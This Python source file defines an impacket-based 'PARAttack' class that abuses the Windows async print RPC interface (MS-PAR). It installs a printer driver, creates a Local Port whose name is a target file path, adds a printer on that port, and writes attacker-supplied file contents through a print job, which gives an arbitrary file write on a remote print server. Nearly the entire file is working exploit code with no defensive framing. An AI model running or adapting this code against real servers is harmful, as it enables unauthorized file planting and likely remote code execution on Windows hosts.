import random
import string

from impacket.dcerpc.v5.rpcrt import DCERPC, APPException
from impacket.dcerpc.v5 import par
from impacket.uuid import string_to_bin
from impacket import LOG
from impacket.dcerpc.v5.dtypes import NULL



DRIVERNAME = 'Generic / Text Only\x00'


def randomString(stringLength=8):
    """ generates a radnom string"""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


class PARAttack:

    @staticmethod
    def set_client_info(obj):
        obj['pClientInfo']['ClientInfo']['tag'] = 1
        obj['pClientInfo']['Level'] = 1

        pClientInfo1 = obj['pClientInfo']['ClientInfo']['pClientInfo1']
        pClientInfo1["dwSize"] = 40
        pClientInfo1["pMachineName"] = 'xxxx\x00'
        pClientInfo1["pUserName"] = 'yyyy\x00'
        pClientInfo1["dwBuildNum"] = 9600
        pClientInfo1["dwMajorVersion"] = 3
        pClientInfo1["dwMinorVersion"] = 0
        pClientInfo1["wProcessorArchitecture"] = 9

    def _run(self):
        printerName = randomString() + '\x00'
        filename = self.config.filename + '\x00'
        printServerName = self.config.printer_server
        content = open(self.config.inputFile, 'rb').read()
        LOG.info('Writing file %s on %s, based on file %s.' % (self.config.filename, printServerName, self.config.inputFile))

        printServerNameN = printServerName + '\x00'

        dce = self.dce

        dce.transfer_syntax = DCERPC.NDR64Syntax
        dce2 = dce.alter_ctx(par.MSRPC_UUID_PAR, include_auth_data=0)
        dce.transfer_syntax = DCERPC.NDRSyntax

        instCmd = par.RpcAsyncInstallPrinterDriverFromPackage(isNDR64=True)
        instCmd["pServerName"] = printServerNameN
        instCmd['pszInfPath'] = NULL
        instCmd['pszDriverName'] = DRIVERNAME
        instCmd["pszEnv"] = "Windows x64\x00"
        instCmd['Flags'] = 0x1

        try:
            dce2.request_raw(instCmd.opnum,instCmd, uuid=par.OBJECT_UUID)
        except APPException as e:
            LOG.warn('got app error %s on install driver, continue' % (str(e))) #some computer sends error is driver already installed


        openCmd = par.RpcOpenPrinterEx()

        openCmd['pPrinterName'] = printServerName + '\\,XcvMonitor Local Port\x00'
        openCmd['pDatatype'] = NULL
        openCmd['pDevModeContainer'] = par.DEVMODE_CONTAINER()
        openCmd['pDevModeContainer']['cbBuf'] = 0
        openCmd['pDevModeContainer']['pDevMode'] = NULL
        openCmd['AccessRequired'] = 1
        PARAttack.set_client_info(openCmd)

        resp = dce.request(openCmd, uuid=par.OBJECT_UUID)
        handle = resp['pHandle']
        errcode = resp['ErrorCode']

        if errcode != 0:
            raise Exception("error in open printer %s" % errcode)

        datasync = par.RpcAsyncXcvData(isNDR64=True)
        datasync['Handle'] = handle
        datasync['DataName'] = 'AddPort\x00'
        datasync['pInputData'] = filename.encode('utf16')[2:]
        datasync['cbInputData'] = len(datasync['pInputData'])
        datasync['cbtBuf'] = 0
        datasync['Status'] = 0

        resp= dce2.request(datasync, uuid=par.OBJECT_UUID)

        addprinter = par.RpcAsyncAddPrinter()
        addprinter['pPrinterName'] = printServerNameN
        addprinter['pPrinterContainer']["Level"] = 2
        addprinter['pPrinterContainer']["DocInfo"]["tag"] = 2

        docinfo = addprinter['pPrinterContainer']["DocInfo"]["pDocInfo1"]
        docinfo["serverName"] = NULL
        docinfo["pPrinterName"] = printerName
        docinfo["pShareName"] = NULL
        docinfo["pPortName"] = filename
        docinfo["pDriverName"] = DRIVERNAME
        docinfo["pComment"] = NULL
        docinfo["pLocation"] = NULL
        docinfo["pSecurityDescriptor"] = NULL
        docinfo['pSepFile'] = NULL
        docinfo['pPrintProcessor'] = NULL
        docinfo['pDatatype'] = NULL
        docinfo['pParameters'] = NULL
        docinfo["pDevMode"] = NULL

        addprinter['pDevModeContainer']['pDevMode'] = NULL
        addprinter['pSecurityContainer']['pSecurity'] = NULL

        PARAttack.set_client_info(addprinter)

        resp = dce.request(addprinter, uuid=par.OBJECT_UUID)

        handle = resp['pHandle']
        errcode = resp['ErrorCode']

        if errcode != 0:
            raise Exception("error in addprinter %s" % errcode)

        # Start writing document
        docInfo = par.DOC_INFO_CONTAINER()
        docInfo['Level'] = 1
        docInfo['DocInfo']['tag'] = 1
        docInfo['DocInfo']['pDocInfo1']['Name'] = 'Document\x00'
        docInfo['DocInfo']['pDocInfo1']['pOutputFile'] = NULL
        docInfo['DocInfo']['pDocInfo1']['pDatatype'] = 'RAW\x00'

        asyncStart = par.RpcAsyncStartDocPrinter()
        asyncStart['hPrinter'] = handle
        asyncStart['DocInfo'] = docInfo

        resp = dce2.request(asyncStart, uuid=par.OBJECT_UUID)

        asyncWritePrinter = par.RpcAsyncWritePrinter()
        asyncWritePrinter['Handle'] = handle
        asyncWritePrinter['pBuf'] = content
        asyncWritePrinter['cbBuf'] = len(asyncWritePrinter['pBuf'])

        resp= dce2.request(asyncWritePrinter, uuid=par.OBJECT_UUID)

        LOG.info("Completed OK, Written %d" % (resp['pcWritten']))
